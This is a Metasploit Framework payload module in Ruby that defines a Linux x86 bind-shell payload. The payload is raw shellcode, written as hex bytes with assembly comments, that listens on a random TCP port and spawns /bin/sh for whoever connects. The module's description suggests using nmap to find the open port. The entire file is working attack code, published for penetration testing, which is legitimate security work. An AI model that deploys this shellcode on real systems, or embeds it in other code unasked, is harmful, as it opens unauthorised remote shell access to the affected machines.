##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Bind TCP Random Port Inline',
      'Description'   => %q{
        Listen for a connection in a random port and spawn a command shell.
        Use nmap to discover the open port: 'nmap -sS target -p-'.
      },
      'Author'        => 'Geyslan G. Bem <geyslan[at]gmail.com>',
      'License'       => BSD_LICENSE,
      'References'    => ['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/shell_bind_tcp_random_port_x86_64.asm'],
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86,
      'Payload'       =>
        {
          'Payload' =>
            "\x31\xdb"              +#  xor    %ebx,%ebx
            "\xf7\xe3"              +#  mul    %ebx
            "\xb0\x66"              +#  mov    $0x66,%al
            "\x43"                  +#  inc    %ebx
            "\x52"                  +#  push   %edx
            "\x53"                  +#  push   %ebx
            "\x6a\x02"              +#  push   $0x2
            "\x89\xe1"              +#  mov    %esp,%ecx
            "\xcd\x80"              +#  int    $0x80
            "\x52"                  +#  push   %edx
            "\x50"                  +#  push   %eax
            "\x89\xe1"              +#  mov    %esp,%ecx
            "\xb0\x66"              +#  mov    $0x66,%al
            "\xb3\x04"              +#  mov    $0x4,%bl
            "\xcd\x80"              +#  int    $0x80
            "\xb0\x66"              +#  mov    $0x66,%al
            "\x43"                  +#  inc    %ebx
            "\xcd\x80"              +#  int    $0x80
            "\x59"                  +#  pop    %ecx
            "\x93"                  +#  xchg   %eax,%ebx
            "\x6a\x3f"              +#  push   $0x3f
            "\x58"                  +#  pop    %eax
            "\xcd\x80"              +#  int    $0x80
            "\x49"                  +#  dec    %ecx
            "\x79\xf8"              +#  jns    20
            "\xb0\x0b"              +#  mov    $0xb,%al
            "\x68\x2f\x2f\x73\x68"  +#  push   $0x68732f2f
            "\x68\x2f\x62\x69\x6e"  +#  push   $0x6e69622f
            "\x89\xe3"              +#  mov    %esp,%ebx
            "\x41"                  +#  inc    %ecx
            "\xcd\x80"               #  int    $0x80
        }
      ))
  end

end
